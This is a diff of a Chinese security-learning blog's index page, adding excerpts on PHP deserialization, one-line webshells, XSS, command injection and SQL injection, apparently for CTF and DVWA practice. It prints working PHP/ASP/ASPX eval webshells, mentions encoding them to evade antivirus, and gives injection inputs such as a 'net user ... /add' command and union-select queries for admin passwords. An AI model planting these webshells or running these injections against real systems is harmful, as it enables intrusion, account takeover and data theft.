代表三个属性</span><br><span class="line">s代表字符串</span><br><span class="line">4代表属性名长度</span><br><span class="line">flag属性名</span><br><span class="line">s:13:&quot;flag&#123;abedyui&#125;&quot; 字符串 属性值长度 属性值</span><br></pre></td></tr></table></figure>
+
+<h2 id="访问控制修饰符"><a href="#访问控制修饰符" class="headerlink" title="访问控制修饰符"></a>访问控制修饰符</h2><p>根据访问控制修饰符的不同 序列化后的 属性长度和属性值会有所不同,所以这里简单提一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public(公有)</span><br><span class="line">protected(受保护)</span><br><span class="line">private(私有的)</span><br><span class="line">protected属性被序列化的时候属性值会变成：%00*%00属性名</span><br><span class="line">private属性被序列化的时候属性值会变成：%00类名%00属性名</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;//这里是private属性被序列化</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="绕过—wakeup（）函数"><a href="#绕过—wakeup（）函数" class="headerlink" title="绕过—wakeup（）函数"></a>绕过—wakeup（）函数</h2><p>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</p>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.PHP 在反序列化时，底层代码是以 ; 作为字段的分隔，以 &#125; 作为结尾(字符串除外)，并且是根据长度判断内容的</span><br><span class="line">2.对类中不存在的属性也会进行反序列化</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="PHP字符逃逸导致的对象注入"><a href="#PHP字符逃逸导致的对象注入" class="headerlink" title="PHP字符逃逸导致的对象注入"></a>PHP字符逃逸导致的对象注入</h2><h3 id="php反序列化三大特性"><a href="#php反序列化三大特性" class="headerlink" title="php反序列化三大特性"></a>php反序列化三大特性</h3><ol>
+<li>php在反序列化的时候，底层代码是以;作为字段的分隔，以}作为结尾(字符串除外)，并且是根据长度判断内容的</li>
+<li>当长度不对应的时候会出现报错</li>
+<li>可以反序列化类中不存在的元素</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/07/ctf%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BA%8F%E5%88%97%E5%8C%96/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/12/14/%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%8F%E5%8E%86wp/" class="archive-article-date">
-  	<time datetime="2021-12-14T08:14:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-12-14</time>
-</a>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-一句话木马" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
     <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/12/14/%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%8F%E5%8E%86wp/">一次靶场经历WP</a>
+      <a class="article-title" href="/2021/08/04/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">一句话木马</a>
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
+        
+        <a href="/2021/08/04/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" class="archive-article-date">
+  	<time datetime="2021-08-04T03:01:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>一句话木马又被称为Webshell，是为了到目前web服务目录继而提权获得系统权限，不论asp，php，jsp，aspx都是如此，那么一句话木马到底是什么呢？</p>
+<p>最简单的一句话木马： <?php @eval($_POST['attack']);?></p>
+<p>基本原理为利用文件上传漏洞，往目标网站中上传一句话木马，然后就可以在本地通过软件获取和控制整个网站目录。@表示后面即使执行错误，也不报错。eval()函数表示括号内的语句字符串什么的全都当作代码执行。$_POST[‘attack’]表示从页面中获得attach这个参数值。</p>
+<h2 id="入侵条件"><a href="#入侵条件" class="headerlink" title="入侵条件"></a>入侵条件</h2><p>要实现入侵必须满足三个条件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）木马上传成功，未被杀；</span><br><span class="line">（2）知道木马的路径在哪；</span><br><span class="line">（3）上传的木马能正常运行。</span><br></pre></td></tr></table></figure>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
+<h2 id="常见形式"><a href="#常见形式" class="headerlink" title="常见形式"></a>常见形式</h2><p>常见的一句话木马：</p>
+<p>php的一句话木马： <?php @eval($_POST['pass']);?><br>asp的一句话是：   &lt;%eval request (“pass”)%&gt;<br>aspx的一句话是：  &lt;%@ Page Language=”Jscript”%&gt; &lt;%eval(Request.Item[“pass”],”unsafe”);%&gt;</p>
+<p>我们可以直接将这些语句插入到网站上的某个asp/aspx/php文件上，或者直接创建一个新的文件，在里面写入这些语句，然后把文件上传到网站上即可。</p>
+<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>eval函数将字符串作为php代码执行。post使服务器接受变量cmd，所以该一句话木马的含义九尾把变量cmd里面的字符串当作php代码来执行。也就是说，想执行什么代码，就把什么代码放进cmd里，用post传输给一句话木马。你想查看目标硬盘里有没有小黄片，可以用php函数：<code>opendir()</code>和<code>readdir()</code>等等。想上传点小黄片，诬陷站主，就用php函数：<code>move_uploaded_file</code>，当然相应的html要写好。你想执行cmd命令，则用<code>exec()</code>。</p>
+<h2 id="木马免杀"><a href="#木马免杀" class="headerlink" title="木马免杀"></a>木马免杀</h2><p>就算木马能正常运行，那么过段时间会不会被管理员杀掉？如何免杀？上面虽然木马上传成功了，但是只要管理员一杀毒，全部都能杀出来。而且，还会很明确的说这是后门。因此，作为攻击者就得会各种免杀技巧。防御者的防御很简单，什么时候哪个论坛爆出新的免杀技巧，安全人员立马将这玩意儿放入黑名单，那么这种免杀技巧就失效了。所以，攻击者得不断创新，发明新的免杀技巧。<br>常见的木马免杀方式有1.将源代码进行再次编码</p>
+<p>2.将一句话木马进行base64编码</p>
+<p>3.数组键值对变形</p>
+<h2 id="小马和大马"><a href="#小马和大马" class="headerlink" title="小马和大马"></a>小马和大马</h2><p>小马和大马都是网页类型中的一种后门，是用来控制网站权限的，最主要的区别是小马是用来上传大马。为什么要这么做呢？因为小马体积小，有比大马更强的隐蔽优势，而且有针对文件大小上传限制的漏洞，所以才有小马，小马也通常用来做备用后门等。</p>
+<h3 id="网页小马"><a href="#网页小马" class="headerlink" title="网页小马"></a>网页小马</h3><p>小马体积非常小，隐蔽性也好，它的作用很简单，就是一个上传功能，它的作用仅仅是为了上传文件，所以也能过一些安全扫描。小马是为了方便上传大马的，因为很多漏洞做了上传限制，大马上传不了，所以可以先上传小马，再接着通过小马上传大马。</p>
+<h3 id="网页大马"><a href="#网页大马" class="headerlink" title="网页大马"></a>网页大马</h3><p>大马的体积较大，比小马大好多倍，但是对应的功能也很强大，包括对数据的管理，命令的操作，数据库的管理，解压缩，提权等，都非常强大。这种大马一旦网站被种了，网站基本就在这个大马控制之中，大马的隐蔽性不好，因为涉及很多敏感代码，安全类程序很容易扫描到。</p>
+<p>备注：中国菜刀的一句话不算，菜刀一句话通过客户端来操作也非常强大，一句话的代码可以和大马实现的一样。我们这里说的小马和大马是指网页类型中的，小马就是为了配合上传大马的，这是它最主要的作用，还有就是小马可以当做备用的后门来使用，一般大马容易被发现，而小马则更容易隐藏在系统的文件夹中。</p>
+<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>Webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。</p>
+<p>webshell根据脚本可以分为php脚本木马，asp脚本木马，也有基于.net的脚本木马和jsp脚本木马。根据功能也可以分为大马，小马和一句话木马。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/04/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/12/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/" class="archive-article-date">
-  	<time datetime="2021-12-14T08:14:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-12-14</time>
-</a>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-xss" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
     <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/12/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/">php代码审计练习</a>
+      <a class="article-title" href="/2021/07/12/xss/">XSS</a>
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
+        
+        <a href="/2021/07/12/xss/" class="archive-article-date">
+  	<time datetime="2021-07-12T03:37:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-12</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="什么是XSS跨站点脚本攻击"><a href="#什么是XSS跨站点脚本攻击" class="headerlink" title="什么是XSS跨站点脚本攻击"></a>什么是XSS跨站点脚本攻击</h1><p>攻击者在被攻击的web服务器网页中嵌入恶意脚本，通常使用js编写的恶意代码，当用户使用浏览器访问被嵌入恶意代码的网页时，恶意代码将会在用户的浏览器上执行。XSS其实也是注入的一种，前端注入。（用户输入的传参会被当作前端代码执行）</p>
+<p>前端代码:HTML+CSS+JS</p>
+<p>XSS属于针对客户端的攻击，受害者最终是用户。</p>
+<p>网站管理人员也属于用户之一，攻击者可以通过XSS假冒管理员身份对网站实施攻击。</p>
+<p>如果我们想要进入管理员后台</p>
+<ol>
+<li>通过后台地址，输入正确的账号。</li>
+<li>通过cookie（获得了管理员用户的权限）不用管理员账号密码进入后台。(这就是利用了XSS)</li>
+</ol>
+<h1 id="XSS攻击的危害"><a href="#XSS攻击的危害" class="headerlink" title="XSS攻击的危害"></a>XSS攻击的危害</h1><ol>
+<li><p>盗取用户cookie</p>
+</li>
+<li><p>修改网页内容</p>
+</li>
+<li><p>网站挂马</p>
+</li>
+<li><p>利用网站重定向</p>
+</li>
+<li><p>XSS蠕虫</p>
+</li>
+</ol>
+<h1 id="怎么检测是否存在XSS"><a href="#怎么检测是否存在XSS" class="headerlink" title="怎么检测是否存在XSS"></a>怎么检测是否存在XSS</h1><p>一般是让浏览器弹窗的经典语句<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<h1 id="xss触发原理"><a href="#xss触发原理" class="headerlink" title="xss触发原理"></a>xss触发原理</h1><p>原理：</p>
+<ol>
+<li>请求网站</li>
+<li>网站返回前端代码</li>
+<li>浏览器根据前端代码执行解析</li>
+<li>渲染出好看的前端代码</li>
+</ol>
+<p>用户输入的传参会被当作前端代码执行(被浏览器执行)，什么情况你西的东西会被当作JS执行？</p>
+<ol>
+<li>标签触发:<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，弹窗是用来证明XSS是否存在的关键。</li>
+<li>通过伪协议触发：<code>&lt;a href=javascript:alert(1)&gt;test&lt;/a&gt;</code>伪协议不同于因特网上所真实存在的协议，如<code>http://,https://.ftp://</code>,伪协议需要点击触发。伪协议只有关联应用能够用 比如php:// tencent://(关联QQ)  javascript:伪协议实际上声明了url的主体是任意的javascript代码。</li>
+<li>事件触发：例如:<code>&lt;img src=&#39;#&#39; onerror=alert(1) /&gt;</code>在加载文档或图像时发生错误。该句的意思就是在加载文档或图像时发生错误执行alert(1)  常用的事件触发还有<code>onload(加载成功时触发)</code>,<code>oninput（输入框输入时触发）</code></li>
+</ol>
+<h1 id="XSS攻击分类"><a href="#XSS攻击分类" class="headerlink" title="XSS攻击分类"></a>XSS攻击分类</h1><h2 id="反射型XSS特点"><a href="#反射型XSS特点" class="headerlink" title="反射型XSS特点"></a>反射型XSS特点</h2><p>反射性XSS也被称为非持久性XSS，这种攻击方式无法将恶意代码保存到网站中，而只对当前URL链接生效，因此它需要用户自行去触发。</p>
+<p>反射性XSS通常出现在网站的搜索栏、用户登入口等地方。</p>
+<h2 id="存储型XSS特点"><a href="#存储型XSS特点" class="headerlink" title="存储型XSS特点"></a>存储型XSS特点</h2><p>存储型XSS攻击是直接将XSS语句插入到网站的正常页面中（通常都是留言板），用户只要访问了这些页面，就会自动执行其中的XSS语句。（你的传参会进入数据库）</p>
+<h2 id="DOM型XSS特点"><a href="#DOM型XSS特点" class="headerlink" title="DOM型XSS特点"></a>DOM型XSS特点</h2><p>DOM型属于反射型的XSS的一种，DOM—XSS是通过URL传入参数去控制触发的，反射性XSS实际上是包括了DOM-XSS，但关键点是通过URL控制了页面的输出，（DOM—XSS也类似，只是因为输出地点不同而导致了结果不一样）</p>
+<p>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</p>
+<h1 id="窃取Cookie："><a href="#窃取Cookie：" class="headerlink" title="窃取Cookie："></a>窃取Cookie：</h1><p>窃取Cookie的XSS代码很复杂。我们一般是去XSS平台生成插入。</p>
+<p>KeepSession:Cookie是有时效性的。</p>
+<h1 id="XSS的过滤方法"><a href="#XSS的过滤方法" class="headerlink" title="XSS的过滤方法"></a>XSS的过滤方法</h1><p>进行转义实体编码输出，加标签，正则匹配替换</p>
+<h1 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h1><ol>
+<li><p>存储型XSS可能存在于任何可以插入数据库的地方。比如:用户注册的页面，留言板，上传文件的文件名，（管理员可见的）报错信息。</p>
+</li>
+<li><p>除此之外还可能存在日志等不与数据库交互的地方。</p>
+</li>
+<li><p>见框就插是一种方法，但是不是唯一方法。</p>
+</li>
+<li><p>用户的输入一般控制得很严格，系统的获取一般控制得不严格。（系统得获取包括有收到邮件，获得xx信息）</p>
+</li>
+</ol>
+<h1 id="Dom-Based-XSS"><a href="#Dom-Based-XSS" class="headerlink" title="Dom Based XSS"></a>Dom Based XSS</h1><p>DOM-based XSS漏洞是基于文档对象模型（Document Object Model，DOM）的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。Dom 中有许多对象，其中一些是用户可以操作的，如url，loacation，referter等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得dom中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM-based xss漏洞。</p>
+<p>DOM就是一个树状的模型，你可以编写js代码根据dom一层一层的节点，去遍历/获取/修改对应的节点，对象，值。（通过JS去对网页进行修改，变化执行）</p>
+<p>每个载入浏览器的html对象，都能被当作document对象。Documemt对象使我们可以从脚本中对HTML页面中的所有元素进行访问。</p>
+<h1 id="Document访问方法"><a href="#Document访问方法" class="headerlink" title="Document访问方法"></a>Document访问方法</h1><ol>
+<li>body:提供对<code>&lt;body&gt;</code>元素的直接访问，对于定义了框架集的文档，该属性引用最外层的<code>&lt;frameset&gt;</code>。</li>
+<li>cookie：设置或返回了与当前文档有关的所有cookie</li>
+<li>domain：返回当前文档的域名</li>
+<li>Lastmodified：返回文档被最后修改的日期和时间。</li>
+<li>referrer：返回载入当前文档的文档url</li>
+<li>title：返回当前文档的标题</li>
+<li>URL：返回当前文档的URL。</li>
+</ol>
+<p><strong>在后端不处理的情况下，因为JS触发的XSS就是Dom型XSS。</strong></p>
+<h1 id="Document对象方法："><a href="#Document对象方法：" class="headerlink" title="Document对象方法："></a>Document对象方法：</h1><p>Document.write() 输出内容</p>
+<p>innerHTML()改变内容</p>
+<p>eval()内容执行</p>
+<ol>
+<li>close()：关闭用document.open()方法打开的输出流，并显示选定的数据。</li>
+<li>getElementByid()：返回对拥有指定id的第一个对象的引用。</li>
+<li>getElemeentsByname():返回带有指定对象名称的对象集合。</li>
+<li>getElementsByTagName()：返回带有指定标签名的对象集合。</li>
+<li>open():打开一个流，以收集来自人恶化document.write()或document.writeln()方法的输出。</li>
+<li>write():向文档写html表达式或者JS代码</li>
+<li>writeln():等同于write()方法，不同的是在每个表达式之后写一个换行符。</li>
+</ol>
+<p>tips：document.write() 可以接受native编码值。</p>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/07/12/xss/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/11/26/%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%8F%E5%8E%86%EF%BC%882%EF%BC%89wp/" class="archive-article-date">
-  	<time datetime="2021-11-26T04:50:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-11-26</time>
-</a>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-命令注入漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
     <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/11/26/%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%8F%E5%8E%86%EF%BC%882%EF%BC%89wp/">一次靶场经历（2）wp</a>
+      <a class="article-title" href="/2021/07/12/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">命令注入漏洞</a>
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
+        
+        <a href="/2021/07/12/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
+  	<time datetime="2021-07-12T01:42:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-12</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="漏洞产生原因："><a href="#漏洞产生原因：" class="headerlink" title="漏洞产生原因："></a>漏洞产生原因：</h2><p>在web程序中，有些功能需求web前端传递参数到后台服务器上执行（特别是一些网络设备的web管理界面，如路由器，交换机等），但由于开发人员没有对输入进行严格的过滤，导致了攻击者可以构造一些额外的“带有非法目的”（比如建立用户账户，越权等）命令，欺骗后台服务器执行。</p>
+<h2 id="漏洞危害："><a href="#漏洞危害：" class="headerlink" title="漏洞危害："></a>漏洞危害：</h2><p>如果Web应用使用的是root权限，则该漏洞可以导致攻击者在服务器上执行任意命令。</p>
+<h2 id="DVWAlow级别的命令漏洞注入中"><a href="#DVWAlow级别的命令漏洞注入中" class="headerlink" title="DVWAlow级别的命令漏洞注入中"></a>DVWAlow级别的命令漏洞注入中</h2><p>shell_exec()函数可以从PHP中去执行操作系统命令，如果不对用户输入的命令进行过滤，那么理论上就可以执行任意的系统命令，也就是相当于直接获得了系统级的shell。</p>
+<p>命令执行语句：</p>
+<p>127.0.0.1 |net user</p>
+<p>127.0.0.1 |net user test 123/add</p>
+<p>windows系统中允许同时执行多条命令的符号</p>
+<p>“|”：前面命令输出结果作为后面命令的输入内容。</p>
+<p>“&amp;”：前面命令执行后接着执行后面的命令。</p>
+<p>“||”：前面命令执行失败的时候才执行后面命令。 （逻辑或）</p>
+<p>”&amp;&amp;“：前面命令执行成功了才执行后面的命令。   （逻辑与）</p>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/07/12/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/11/25/Gopher%E5%8D%8F%E8%AE%AE%E5%9C%A8ssrf%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/" class="archive-article-date">
-  	<time datetime="2021-11-25T13:24:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-11-25</time>
-</a>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-SQL注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
     <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/11/25/Gopher%E5%8D%8F%E8%AE%AE%E5%9C%A8ssrf%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/">Gopher协议在ssrf漏洞中的应用</a>
+      <a class="article-title" href="/2021/07/11/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
+        
+        <a href="/2021/07/11/SQL%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+  	<time datetime="2021-07-11T08:20:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-11</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="SQL注入本质"><a href="#SQL注入本质" class="headerlink" title="SQL注入本质"></a>SQL注入本质</h1><p>注入攻击的本质，是把用户输入的数据当作代码执行。</p>
+<p>这里有两个关键条件：</p>
+<ol>
+<li>第一个是用户能够控制输入</li>
+<li>第二个是原本程序要执行的代码，拼接了用户输入的数据然后进行执行</li>
+</ol>
+<h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><p>数字型注入</p>
+<p>SELECT first_name,last_name FROM users WHERE user_id=$id</p>
+<p>字符型注入</p>
+<p>SELECT first_name,last_name FROM users WHERE user_id=’$id’</p>
+<p>无论何种类型，都可以通过直接输入单引号来判断是否存在注入点。可以分别输入3和1+2，根据显示结果来判断数据类型。</p>
+<p>如果是数字型，则会做运算，如果没做，则反之。</p>
+<p>字符型注入最关键的是如何闭合SQL语句以及注释多余的代码。</p>
+<p>SELECT first_name,last_name FROM users WHERE user_id=’ ‘or 1=1 or’ ‘</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; order by 1#`;(按照Mysql语法，#后面会被注释掉，使用这种方法屏蔽掉后面的单引号，避免语法错误)</span><br></pre></td></tr></table></figure>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
+<p>order by 用于对结果集按照一个列或者多个列进行排序(默认是升序)</p>
+<h1 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h1><p>最古老的方法：</p>
+<p>and 1=1 页面正常</p>
+<p>and 1=2 页面不正常</p>
+<p>最简单的方法： 页面后面加<code>&#39;</code>，可以尝试</p>
+<p>还有一个办法：如果是数字型传参，可以尝试数字运算</p>
+<p>例如：</p>
+<p>id=1 页面显示id=1的页面。</p>
+<p>id=2-1 页面显示id=1的页面。</p>
+<p>and 1=1 and 1=2 被拦截的可能性很高。</p>
+<p>可以尝试 and -1=-1 and -1=-2 and 1&gt;0 or 1=1 或者or sleep（5）</p>
+<h1 id="正常SQL注入流程"><a href="#正常SQL注入流程" class="headerlink" title="正常SQL注入流程"></a>正常SQL注入流程</h1><p>显错注入-联合查询（mysql数据库）的基本流程：</p>
+<p>是否存在注入点—猜解字段数—联合查询寻找输出点—然后用系统自带库查询表名，字段名—查询我们需要的字段的值。</p>
+<p>联合查询[将两个查询语句结果一起输出]</p>
+<p>select * from news where id=1  (第一条数据)</p>
+<p>union</p>
+<p>select password,username from admin; （第二条数据）</p>
+<p>联合查询要求两个查询语句的结果集字段数必须相同。</p>
+<p>Mysql在5.0以上版本加入了 information_shcema这个系统自带库，其中保存着关于Mysql服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。</p>
+<p>information_schema.tables 存放表名和库名的对应。[注:information_shcema.tables实际上是选中information_schema库中的tables表]</p>
+<p>information_schema.columns 存放字段名和表名的对应。</p>
+<h1 id="php代码分析"><a href="#php代码分析" class="headerlink" title="php代码分析"></a>php代码分析</h1><p>if(isset($_GET[‘Submit’])){   //判断submit变量是否存在</p>
+<p>$id=$_GET[‘id’];   //获取id变量的值并赋值给变量$id</p>
+<p>$getid=”SELECTI first_name,last_name FROM users WHERE use_id=’$id’”;</p>
+<p>//将select查询语句赋值给变量$getid</p>
+<p>$result=mysql_query($getid) or die(‘<pre>'.mysql_error().'</pre>&gt;’);</p>
+<p>//mysql_query函数执行mysql查询</p>
+<p>mysql_query（）如果是执行查询之类的语句（select），那么会返回一个资源标识符，也就是我们要查找的数据结果集；</p>
+<p>mysql——query（）如果是执行增删改之类的语句，返回的就是true或者false了。</p>
+<p>//die()函数输出一条消息，并退出当前脚本</p>
+<p>//mysql_error()函数返回上一个MySQL操作产生的文本错误信息。</p>
+<p>//or之前的语句执行不成功时，才会执行后面的语句。</p>
+<p>//and之前的语句执行成功时，才会执行后面的语句。</p>
+<p>}</p>
+<h1 id="如何防御sql注入"><a href="#如何防御sql注入" class="headerlink" title="如何防御sql注入"></a>如何防御sql注入</h1><p>sql注入漏洞的形成原因：</p>
+<p>用户构造的语句被代入到数据库中执行</p>
+<p>防御sql注入的首要原则:</p>
